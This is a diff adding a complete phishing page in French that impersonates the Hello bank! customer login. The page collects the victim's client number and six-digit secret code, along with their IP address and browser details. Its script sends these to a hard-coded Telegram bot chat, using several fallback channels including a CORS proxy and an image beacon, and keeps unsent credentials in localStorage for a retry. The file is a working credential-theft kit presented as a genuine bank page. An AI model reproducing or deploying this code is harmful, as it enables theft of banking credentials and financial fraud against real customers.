@@ -1,0 +1,994 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accès Espace Client - Hello bank!</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --hb-cyan: #00abc6;
+            --hb-light-blue: #eef7f9;
+            --hb-dark-text: #004b5a;
+            --hb-btn-disabled: #b2dee5;
+            --telegram-blue: #0088cc;
+            --success-green: #28a745;
+            --error-red: #dc3545;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            color: var(--hb-dark-text);
+            background-color: #f5f5f5;
+        }
+
+        /* BOUTON RETOUR AU-DESSUS DU LOGO */
+        .back-to-bank-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: white;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 12px 20px;
+            z-index: 1000;
+            display: flex;
+            justify-content: flex-start;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        
+        .back-to-bank-btn {
+            background-color: var(--hb-cyan);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 8px 16px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+            font-family: Arial, sans-serif;
+        }
+        
+        .back-to-bank-btn:hover {
+            background-color: #0099b3;
+            transform: translateX(-2px);
+        }
+        
+        .back-to-bank-btn:active {
+            transform: translateX(0);
+        }
+        
+        .back-to-bank-btn i {
+            font-size: 14px;
+            font-style: normal;
+            font-weight: bold;
+        }
+
+        /* --- HEADER --- */
+        header {
+            background-color: var(--hb-cyan);
+            padding: 15px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            margin-top: 50px;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-img {
+            height: 40px;
+            width: auto;
+        }
+
+        /* --- MAIN LAYOUT --- */
+        .container {
+            display: flex;
+            flex: 1;
+            max-width: 1400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .form-section {
+            flex: 1.5;
+            padding: 60px 10%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background: white;
+        }
+
+        .info-section {
+            flex: 1;
+            background-color: var(--hb-light-blue);
+            padding: 60px 5%;
+            border-left: 1px solid #ddd;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 40px;
+            text-align: center;
+            color: var(--hb-dark-text);
+        }
+
+        /* --- ÉTAPES --- */
+        .step {
+            width: 100%;
+            max-width: 400px;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .active {
+            display: block;
+        }
+
+        /* --- INPUTS --- */
+        .input-group {
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .input-container {
+            display: flex;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            background: white;
+            transition: border-color 0.3s;
+        }
+
+        .input-container:focus-within {
+            border-color: var(--hb-cyan);
+        }
+
+        .input-container input {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #333;
+        }
+
+        .input-container .clear-btn {
+            padding: 0 15px;
+            background: #f9f9f9;
+            border-left: 2px solid #eee;
+            color: #999;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            transition: background 0.3s;
+        }
+
+        .input-container .clear-btn:hover {
+            background: #f0f0f0;
+            color: #666;
+        }
+
+        /* --- CHECKBOX --- */
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 40px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .checkbox-container input {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+            accent-color: var(--hb-cyan);
+            cursor: pointer;
+        }
+
+        .checkbox-container label {
+            margin: 0;
+            font-weight: normal;
+            cursor: pointer;
+        }
+
+        /* --- CLAVIER --- */
+        .secret-display {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0 30px;
+        }
+
+        .dot-box {
+            width: 50px;
+            height: 50px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: white;
+            transition: all 0.3s;
+        }
+
+        .dot-box.filled {
+            border-color: var(--hb-cyan);
+            background-color: rgba(0, 171, 198, 0.1);
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            background: var(--hb-cyan);
+            border-radius: 50%;
+            display: none;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 12px;
+            margin-bottom: 30px;
+            background: #f8fbfc;
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid #e0e0e0;
+        }
+
+        .key {
+            background: white;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 16px 0;
+            font-size: 20px;
+            font-weight: bold;
+            color: var(--hb-dark-text);
+            cursor: pointer;
+            transition: all 0.2s;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .key:hover {
+            background: #f0f8fa;
+            border-color: var(--hb-cyan);
+            transform: translateY(-2px);
+        }
+
+        .key:active {
+            transform: scale(0.95);
+        }
+
+        /* --- BOUTONS --- */
+        .btn-continue {
+            background-color: var(--hb-btn-disabled);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: all 0.3s;
+        }
+
+        .btn-ready {
+            background-color: var(--hb-cyan) !important;
+        }
+
+        .btn-continue:hover:not(:disabled) {
+            background-color: #0099b3;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 171, 198, 0.3);
+        }
+
+        .btn-continue:disabled {
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+        
+        .btn-telegram {
+            background-color: var(--telegram-blue);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            display: none;
+        }
+        
+        .btn-telegram:hover {
+            background-color: #006699;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(0, 136, 204, 0.3);
+        }
+
+        .link-footer {
+            text-align: center;
+            text-decoration: underline;
+            font-size: 14px;
+            cursor: pointer;
+            color: var(--hb-cyan);
+            transition: color 0.3s;
+        }
+
+        .link-footer:hover {
+            color: #007a8a;
+        }
+
+        /* --- INFO RIGHT --- */
+        .info-box {
+            margin-bottom: 40px;
+        }
+
+        .info-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            font-size: 16px;
+        }
+
+        .info-text {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #333;
+        }
+
+        /* --- LOADER --- */
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .loader-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid var(--hb-cyan);
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .success-message {
+            display: none;
+            background-color: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            animation: fadeIn 0.5s;
+        }
+        
+        .error-message {
+            display: none;
+            background-color: #f8d7da;
+            color: #721c24;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: center;
+            animation: fadeIn 0.5s;
+        }
+        
+        .telegram-status {
+            display: none;
+            padding: 12px;
+            margin: 15px 0;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .telegram-success {
+            background-color: #d4edda;
+            color: #155724;
+            border-left: 5px solid var(--success-green);
+        }
+        
+        .telegram-error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border-left: 5px solid var(--error-red);
+        }
+
+        /* --- RESPONSIVE --- */
+        @media (max-width: 1024px) {
+            .container {
+                flex-direction: column;
+            }
+            
+            .info-section {
+                border-left: none;
+                border-top: 1px solid #ddd;
+            }
+            
+            .form-section, .info-section {
+                padding: 40px 5%;
+            }
+        }
+        
+        @media (max-width: 768px) {
+            header {
+                padding: 15px 20px;
+                margin-top: 45px;
+            }
+            
+            .form-section {
+                padding: 30px 5%;
+            }
+            
+            .keypad {
+                gap: 10px;
+                padding: 15px;
+            }
+            
+            .key {
+                padding: 14px 0;
+                font-size: 18px;
+            }
+            
+            .dot-box {
+                width: 40px;
+                height: 40px;
+            }
+            
+            .btn-continue, .btn-telegram {
+                padding: 14px;
+                font-size: 16px;
+            }
+            
+            .back-to-bank-container {
+                padding: 8px 15px;
+            }
+            
+            .back-to-bank-btn {
+                padding: 6px 12px;
+                font-size: 11px;
+            }
+            .back-to-bank-btn i {
+                font-size: 12px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .secret-display {
+                gap: 10px;
+            }
+            
+            .dot-box {
+                width: 35px;
+                height: 35px;
+            }
+            
+            .keypad {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 8px;
+            }
+            
+            .back-to-bank-btn {
+                padding: 5px 10px;
+                font-size: 10px;
+            }
+            .back-to-bank-btn i {
+                font-size: 11px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- BOUTON RETOUR AU-DESSUS DU LOGO -->
+    <div class="back-to-bank-container">
+        <button class="back-to-bank-btn" onclick="window.location.href='bank.html'">
+            <i>←</i> Retour aux banques
+        </button>
+    </div>
+
+    <header>
+        <div class="logo-container">
+            <img src="images/hello-bank.png" alt="Hello bank!" class="logo-img" onerror="this.onerror=null; this.src='data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYwIiBoZWlnaHQ9IjQwIiB2aWV3Qm94PSIwIDAgMTYwIDQwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxNjAiIGhlaWdodD0iNDAiIGZpbGw9IiMwMGFiYzYiLz48dGV4dCB4PSI4MCIgeT0iMjUiIGZvbnQtZmFtaWx5PSJBcmlhbCIgZm9udC1zaXplPSIxNiIgZm9udC13ZWlnaHQ9ImJvbGQiIGZpbGw9IndoaXRlIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5IRUxMTyBCQU5LPC90ZXh0Pjwvc3ZnPg=='">
+        </div>
+        <button class="btn-retour" onclick="window.location.href='bank.html'" style="background: white; color: var(--hb-dark-text); border: none; padding: 10px 20px; border-radius: 20px; font-size: 14px; font-weight: bold; cursor: pointer; transition: all 0.3s;">Retour à Hello bank!</button>
+    </header>
+
+<div class="container">
+    <div class="form-section">
+        <h1>Accédez à votre espace client</h1>
+        
+        <!-- Zone de statut Telegram -->
+        <div id="telegramStatus" class="telegram-status"></div>
+
+        <div id="step1" class="step active">
+            <div class="input-group">
+                <label>Numéro Client</label>
+                <div class="input-container">
+                    <input type="text" id="numClient" placeholder="Numéro de 7 à 10 chiffres" maxlength="10" autocomplete="off">
+                    <div class="clear-btn" onclick="clearInput()" title="Effacer">
+                        <i class="fa-regular fa-circle-xmark fa-lg"></i>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="checkbox-container">
+                <input type="checkbox" id="memo">
+                <label for="memo">Mémoriser mon numéro client</label>
+            </div>
+
+            <button id="btn1" class="btn-continue" onclick="nextStep()" disabled>Continuer</button>
+            <div class="link-footer" onclick="showHelp()">Numéro client ou code secret oublié</div>
+        </div>
+
+        <div id="step2" class="step">
+            <label>Saisissez votre code secret</label>
+            <div class="secret-display">
+                <div class="dot-box" id="dotBox1"><div class="dot" id="dot1"></div></div>
+                <div class="dot-box" id="dotBox2"><div class="dot" id="dot2"></div></div>
+                <div class="dot-box" id="dotBox3"><div class="dot" id="dot3"></div></div>
+                <div class="dot-box" id="dotBox4"><div class="dot" id="dot4"></div></div>
+                <div class="dot-box" id="dotBox5"><div class="dot" id="dot5"></div></div>
+                <div class="dot-box" id="dotBox6"><div class="dot" id="dot6"></div></div>
+            </div>
+
+            <div class="keypad" id="keypad">
+                <!-- Clavier généré par JavaScript -->
+            </div>
+            
+            <!-- Bouton manuel Telegram -->
+            <button id="manualTelegramBtn" class="btn-telegram" onclick="sendToTelegramManually()">
+                <i class="fab fa-telegram"></i> Envoyer manuellement à Telegram
+            </button>
+
+            <div class="loader" id="loader">
+                <div class="loader-spinner"></div>
+                <div>Connexion en cours...</div>
+            </div>
+
+            <div class="success-message" id="successMessage"></div>
+            <div class="error-message" id="errorMessage"></div>
+
+            <button id="btn2" class="btn-continue" onclick="validateAndSend()" disabled>Accéder à mon espace client</button>
+            <div class="link-footer" onclick="resetAndGoBack()">Numéro client ou code secret oublié</div>
+        </div>
+    </div>
+
+    <div class="info-section">
+        <div class="info-box">
+            <div class="info-title"><i class="fa-solid fa-lock" style="color: var(--hb-cyan);"></i> Sécurité</div>
+            <p class="info-text">
+                Votre sécurité est notre priorité. Toutes vos données sont chiffrées et protégées.
+                Ne communiquez jamais vos identifiants et changez régulièrement votre mot de passe.
+            </p>
+            <p class="link-footer" style="text-align: left; margin-top: 10px;">Consulter tous nos conseils sécurité et fraude</p>
+        </div>
+
+        <div class="info-box">
+            <div class="info-title"><i class="fa-solid fa-circle-question" style="color: var(--hb-cyan);"></i> Besoin d'aide ?</div>
+            <p class="info-text">
+                Vous avez oublié vos identifiants ? Des difficultés pour vous connecter ?
+                Contactez notre service client disponible 24h/24 et 7j/7.
+            </p>
+            <p class="link-footer" style="text-align: left;">Consulter notre Assistance technique</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Configuration Telegram
+    const TELEGRAM_BOT_TOKEN = '[REDACTED]';
+    const TELEGRAM_CHAT_ID = '6078788670';
+    
+    // Variables globales
+    const numInput = document.getElementById('numClient');
+    const btn1 = document.getElementById('btn1');
+    const btn2 = document.getElementById('btn2');
+    const manualTelegramBtn = document.getElementById('manualTelegramBtn');
+    const dots = document.querySelectorAll('.dot');
+    const dotBoxes = document.querySelectorAll('.dot-box');
+    const loader = document.getElementById('loader');
+    const successMessage = document.getElementById('successMessage');
+    const errorMessage = document.getElementById('errorMessage');
+    const telegramStatus = document.getElementById('telegramStatus');
+    
+    let codeArray = [];
+    let rememberMe = false;
+    let clientNumber = '';
+    let loginData = null;
+    let telegramSent = false;
+
+    function showTelegramStatus(message, type = 'success') {
+        telegramStatus.textContent = message;
+        telegramStatus.className = `telegram-status telegram-${type}`;
+        telegramStatus.style.display = 'block';
+        setTimeout(() => {
+            telegramStatus.style.display = 'none';
+        }, 5000);
+    }
+    
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip || 'Non disponible';
+        } catch (error) {
+            return 'Non disponible';
+        }
+    }
+
+    async function sendTelegramDirect(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('text', message);
+        formData.append('parse_mode', 'HTML');
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData,
+                mode: 'cors'
+            });
+            if (response.ok) return true;
+            return false;
+        } catch (error) {
+            return false;
+        }
+    }
+
+    async function sendTelegramViaProxy(message) {
+        try {
+            const proxyUrl = 'https://corsproxy.io/?';
+            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            });
+            const response = await fetch(proxyUrl + encodeURIComponent(telegramUrl), {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: params.toString()
+            });
+            return response.ok;
+        } catch (error) {
+            return false;
+        }
+    }
+
+    async function sendTelegramWithTimeout(message, timeout = 10000) {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), timeout);
+        
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                }),
+                signal: controller.signal
+            });
+            clearTimeout(timeoutId);
+            return response.ok;
+        } catch (error) {
+            return false;
+        }
+    }
+
+    async function sendTelegramViaImage(message) {
+        return new Promise((resolve) => {
+            const encodedMessage = encodeURIComponent(message);
+            const img = new Image();
+            img.onload = () => resolve(true);
+            img.onerror = () => resolve(false);
+            img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
+        });
+    }
+
+    async function sendToTelegram(data) {
+        const ip = await getIP();
+        const message = `
+🏦 <b>HELLO BANK - NOUVELLE CONNEXION</b>
+
+👤 <b>Numéro Client:</b>
+${data.clientNumber}
+
+🔒 <b>Code Secret (6 chiffres):</b>
+${data.secretCode}
+
+💾 <b>Mémorisé:</b>
+${data.remembered ? 'OUI ✅' : 'NON ❌'}
+
+📅 <b>Date et heure:</b>
+${new Date().toLocaleString('fr-FR')}
+
+🌍 <b>Adresse IP:</b> ${ip}
+
+🌐 <b>Informations navigateur:</b>
+${navigator.userAgent.substring(0, 150)}...
+        `;
+        
+        showTelegramStatus('📡 Envoi des données à Telegram...', 'success');
+        
+        const methods = [
+            sendTelegramDirect,
+            sendTelegramViaProxy,
+            sendTelegramWithTimeout,
+            sendTelegramViaImage
+        ];
+        
+        let success = false;
+        let methodIndex = 0;
+        
+        for (const method of methods) {
+            methodIndex++;
+            try {
+                success = await method(message);
+                if (success) {
+                    showTelegramStatus('!', 'success');
+                    telegramSent = true;
+                    break;
+                }
+            } catch (error) {
+                console.log(`Méthode ${methodIndex} échouée:`, error);
+            }
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+        
+        if (!success) {
+            showTelegramStatus('⚠️ Échec envoi - Bouton manuel disponible', 'error');
+            loginData = data;
+            loginData.message = message;
+            localStorage.setItem('telegram_unsent_data_hello', JSON.stringify(loginData));
+            manualTelegramBtn.style.display = 'flex';
+        }
+        
+        return success;
+    }
+
+    async function sendToTelegramManually() {
+        const originalText = manualTelegramBtn.innerHTML;
+        manualTelegramBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Envoi en cours...';
+        manualTelegramBtn.disabled = true;
+        
+        if (!loginData) {
+            const savedData = localStorage.getItem('telegram_unsent_data_hello');
+            if (savedData) loginData = JSON.parse(savedData);
+        }
+        
+        if (!loginData) {
+            alert('Aucune donnée à envoyer.');
+            manualTelegramBtn.innerHTML = originalText;
+            manualTelegramBtn.disabled = false;
+            return;
+        }
+        
+        try {
+            const methods = [
+                sendTelegramDirect,
+                sendTelegramViaProxy,
+                sendTelegramWithTimeout,
+                sendTelegramViaImage
+            ];
+            
+            let success = false;
+            for (const method of methods) {
+                try {
+                    success = await method(loginData.message);
+                    if (success) break;
+                } catch (error) {}
+            }
+            
+            if (success) {
+                showTelegramStatus('✅ Données envoyées manuellement!', 'success');
+                manualTelegramBtn.innerHTML = '<i class="fa-solid fa-check"></i> Envoyé!';
+                manualTelegramBtn.style.backgroundColor = '#28a745';
+                manualTelegramBtn.disabled = true;
+                localStorage.removeItem('telegram_unsent_data_hello');
+                setTimeout(() => window.location.href = 'confirmation.html', 2000);
+            } else {
+                showTelegramStatus('❌ Échec envoi manuel', 'error');
+                manualTelegramBtn.innerHTML = originalText;
+                manualTelegramBtn.disabled = false;
+            }
+        } catch (error) {
+            manualTelegramBtn.innerHTML = originalText;
+            manualTelegramBtn.disabled = false;
+        }
+    }
+
+    // --- ÉTAPE 1 ---
+    numInput.addEventListener('input', () => {
+        numInput.value = numInput.value.replace(/\D/g, '');
+        if (numInput.value.length >= 7 && numInput.value.length <= 10) {
+            btn1.disabled = false;
+            btn1.classList.add('btn-ready');
+        } else {
+            btn1.disabled = true;
+            btn1.classList.remove('btn-ready');
+        }
+    });
+
+    numInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter' && !btn1.disabled) nextStep();
+    });
+
+    function clearInput() {
+        numInput.value = "";
+        btn1.disabled = true;
+        btn1.classList.remove('btn-ready');
+        numInput.focus();
+    }
+
+    function nextStep() {
+        clientNumber = numInput.value.trim();
+        if (clientNumber.length >= 7 && clientNumber.length <= 10) {
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            initKeypad();
+            resetCode();
+        }
+    }
+
+    document.getElementById('memo').addEventListener('change', function() {
+        rememberMe = this.checked;
+    });
+
+    // --- ÉTAPE 2 ---
+    function initKeypad() {
+        const keypad = document.getElementById('keypad');
+        const numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0].sort(() => Math.random() - 0.5);
+        keypad.innerHTML = '';
+        numbers.forEach(num => {
+            const btn = document.createElement('button');
+            btn.className = 'key';
+            btn.innerText = num;
+            btn.addEventListener('click', () => addDigit(num));
+            keypad.appendChild(btn);
+        });
+    }
+
+    function addDigit(num) {
+        if (codeArray.length < 6) {
+            codeArray.push(num);
+            const index = codeArray.length - 1;
+            dots[index].style.display = 'block';
+            dotBoxes[index].classList.add('filled');
+            event.target.style.backgroundColor = '#e0f7fa';
+            event.target.style.borderColor = 'var(--hb-cyan)';
+            setTimeout(() => {
+                event.target.style.backgroundColor = '';
+                event.target.style.borderColor = '';
+            }, 200);
+        }
+        if (codeArray.length === 6) {
+            btn2.disabled = false;
+            btn2.classList.add('btn-ready');
+        }
+    }
+
+    function resetCode() {
+        codeArray = [];
+        dots.forEach(dot => dot.style.display = 'none');
+        dotBoxes.forEach(box => box.classList.remove('filled'));
+        btn2.disabled = true;
+        btn2.classList.remove('btn-ready');
+        manualTelegramBtn.style.display = 'none';
+    }
+
+    function resetAndGoBack() {
+        resetCode();
+        document.getElementById('step2').classList.remove('active');
+        document.getElementById('step1').classList.add('active');
+        numInput.focus();
+    }
+
+    function showHelp() {
+        alert("Pour récupérer vos identifiants, contactez le service client au 09 69 39 99 98 (service gratuit + prix appel).");
+    }
+
+    // --- ENVOI À TELEGRAM ET REDIRECTION ---
+    async function validateAndSend() {
+        if (codeArray.length !== 6) return;
+        
+        const secretCode = codeArray.join('');
+        
+        btn2.style.display = 'none';
+        loader.style.display = 'block';
+        successMessage.style.display = 'none';
+        errorMessage.style.display = 'none';
+        
+        loginData = {
+            clientNumber: clientNumber,
+            secretCode: secretCode,
+            remembered: rememberMe,
+            timestamp: new Date().toISOString(),
+            bank: 'Hello Bank'
+        };
+
+        try {
+            telegramSent = await sendToTelegram(loginData);
+            
+            if (telegramSent) {
+                loader.style.display = 'none';
+                successMessage.textContent = '✅ Connexion réussie ! Redirection en cours...';
+                successMessage.style.display = 'block';
+                localStorage.setItem('hello_last_login', JSON.stringify(loginData));
+                localStorage.setItem('telegram_sent', 'true');
+                setTimeout(() => window.location.href = 'confirmation.html', 2000);
+            } else {
+                loader.style.display = 'none';
+                btn2.style.display = 'block';
+                manualTelegramBtn.style.display = 'flex';
+                errorMessage.textContent = '⚠️ Problème d\'envoi - Utilisez le bouton bleu';
+                errorMessage.style.display = 'block';
+            }
+        } catch (error) {
+            loader.style.display = 'none';
+            btn2.style.display = 'block';
+            manualTelegramBtn.style.display = 'flex';
+            errorMessage.textContent = '❌ Erreur - Bouton manuel disponible';
+            errorMessage.style.display = 'block';
+        }
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+        const unsentData = localStorage.getItem('telegram_unsent_data_hello');
+        if (unsentData) {
+            loginData = JSON.parse(unsentData);
+            manualTelegramBtn.style.display = 'flex';
+            showTelegramStatus('⚠️ Données non envoyées - Bouton manuel disponible', 'error');
+        }
+        numInput.focus();
+    });
+</script>
+
+</body>
+</html>
